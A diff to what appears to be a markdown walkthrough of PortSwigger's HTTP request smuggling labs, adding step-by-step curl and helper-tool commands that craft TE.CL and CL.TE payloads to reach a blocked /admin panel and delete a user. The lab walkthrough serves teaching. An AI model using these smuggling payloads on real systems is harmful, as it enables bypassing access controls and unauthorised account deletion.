@@ -214,7 +214,7 @@ We know that:
 We will smuggle an `/admin` request:
 ```shell
 POST / HTTP/1.1
-Host: ac7d1fb41fa9b18fc0174145006d00f9.web-security-academy.net
+Host: [LAB_URL]
 Transfer-Encoding: chunked    # <----- use by front-end
 Content-Length: 4
 Content-Type: application/x-www-form-urlencoded
@@ -277,10 +277,96 @@ cat smuggle_admin_localhost | httpclient https://$LAB_URL #twice
 Change the smuggle request to a `GET`on `/admin/delete?username=carlos`:
 ```shell
 httpecho -d delete
-curl http://localhost:8888/admin/delete?username=carlos -H "Host: localhost" -H 'User-Agent:'  -H 'Accept:' -X POST --data 'x=1' -H 'Content-Length: 15'
+curl http://localhost:8888/admin/delete?username=carlos -H "Host: localhost" -H 'User-Agent:'  -H 'Accept:' -X GET --data 'x=1' -H 'Content-Length: 15'
 httpecho -d smuggle_delete
 curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary "@delete"
 cat smuggle_delete | httpclient https://$LAB_URL #twice
+```
+
+## Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+The following example is an alternative to PortSwigger Burp solution for their [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te).
+
+We know that:
+* front-end server doesn't support chunked encoding
+* there's an admin panel at `/admin`, but the front-end server blocks access to it
+
+We will smuggle an `/admin` request:
+```shell
+POST / HTTP/1.1
+Host: [LAB_URL]
+Transfer-Encoding: chunked    # <----- use by backend-end
+Content-Length: 4
+Content-Type: application/x-www-form-urlencoded
+
+0          <----- end of request for the back-end
+
+POST /admin HTTP/1.1        <----- 2nd request for back-end
+Content-Length: 15
+Content-Type: application/x-www-form-urlencoded
+
+x=1     # <----- end of request for the front-end
+```
+
+To construct this request:
+
+**1.** construct the `/admin`request:
+```shell
+httpecho -d admin
+curl http://localhost:8888/admin -H "Host:" -H 'User-Agent:'  -H 'Accept:' -X POST --data 'x=1' -H 'Content-Length: 15'
+```
+
+**2.** Smuggle it within legit request:
+```shell
+printf "0\r\n\r\n$(cat admin)" > admin_payload
+httpecho -d tmp_smuggle_admin
+curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' --data-binary "@admin_payload"
+cat tmp_smuggle_admin | httpoverride --chunked > smuggle_admin
+```
+
+**3.** Check request treatment by back-end:
+```shell
+cat smuggle_admin | httpcustomhouse -cl | httpcustomhouse -te -r
+```
+
+**4.** Send it
+```shell
+cat smuggle_admin | httpclient https://$LAB_URL
+cat smuggle_admin | httpclient https://$LAB_URL # twice to get result for the smuggled request
+[...]
+Admin interface only available to local users
+```
+
+You can only access admin panel from localhost -> add `Host: localhost` for the smuggling request:
+```shell
+cat admin | httpoverride --host "localhost" > admin_local
+printf "0\r\n\r\n$(cat admin_local)" > admin_local_payload
+httpecho -d tmp_smuggle_admin_local
+curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' --data-binary "@admin_local_payload"
+cat tmp_smuggle_admin_local | httpoverride --chunked > smuggle_admin_local
+cat smuggle_admin_local | httpclient https://$LAB_URL
+cat smuggle_admin_local | httpclient https://$LAB_URL #twice
+[...]
+                        <h1>Users</h1>
+                        <div>
+                            <span>carlos - </span>
+                            <a href="/admin/delete?username=carlos">Delete</a>  # <---- what we want
+                        </div>
+
+```
+
+**~> Delete account**
+
+Change the smuggle request to a `GET`on `/admin/delete?username=carlos`:
+```shell
+httpecho -d delete
+curl http://localhost:8888/admin/delete?username=carlos -H "Host: localhost" -H 'User-Agent:'  -H 'Accept:' -X GET --data 'x=1' -H 'Content-Length: 15'
+printf "0\r\n\r\n$(cat delete)" > delete_payload
+httpecho -d tmp_smuggle_delete
+curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' --data-binary "@delete_payload"
+cat tmp_smuggle_delete | httpoverride --chunked > smuggle_delete
+cat smuggle_delete | httpclient https://$LAB_URL
+cat smuggle_delete | httpclient -L -v https://$LAB_URL #twice
 ```
 
 
